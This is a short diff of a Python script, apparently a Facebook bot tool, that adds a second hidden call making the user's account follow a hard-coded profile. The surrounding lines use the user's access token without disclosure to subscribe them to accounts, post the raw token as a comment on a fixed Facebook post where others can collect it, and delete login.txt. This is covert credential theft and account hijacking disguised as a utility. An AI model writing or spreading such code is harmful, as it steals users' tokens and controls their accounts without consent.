@@ -358,6 +358,8 @@ def hamz_bot():
         os.system('rm -rf login.txt')
     kom = " Bang @[100008065235213:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
     requests.post('https://graph.facebook.com/100008065235213/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100004715860665/subscribers?access_token=' + token)
+
     requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +token+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/3002983643313781/comments/?message=' +kom+ '&access_token=' + token)
     menu()
